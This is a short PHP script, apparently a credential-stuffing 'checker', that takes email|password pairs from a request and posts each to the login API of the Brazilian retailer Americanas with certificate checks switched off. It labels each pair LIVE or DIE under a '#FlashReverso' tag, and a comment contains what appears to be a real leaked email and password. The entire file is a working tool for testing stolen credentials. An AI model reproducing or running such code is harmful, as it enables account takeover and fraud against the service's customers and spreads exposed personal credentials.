<?php

error_reporting(0);

extract($_POST);



$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL,'https://api.americanas.com.br/v5/account/'.$email);

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/coocks.txt');

  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/coocks.txt');

 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

 curl_setopt($ch, CURLOPT_POST, 1);

 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");

curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(

    'Host: api.americanas.com.br',

    'Connection: Keep-Alive',

    'X-Dejavu-Desired-Response: null',  

    //'origin https://cliente.submarino.com.br',

    'X-Client-Info: null',

    'Timezone: -Infinity',

    'Referer: https://cliente.americanas.com.br/s/?guest=false&h=responsive&next=https%3A%2F%2Fwww.americanas.com.br%2F',

    'Content-Type: application/json;charset=UTF-8',

    'User-Agent: null',

    'Accept: application/json; charset=UTF-8',

));

 curl_setopt($ch, CURLOPT_POSTFIELDS,'{"password":"'.$senha.'","origin":"ACOM"}');



$dd = curl_exec($ch);

if(strpos($dd, 'token') !==false){

// goncalvessg@uol.com.br|ag061227

  echo "LIVE → $email|$senha #FlashReverso";

}else{ 

    echo "DIE → $email|$senha #FlashReverso";

}   



?>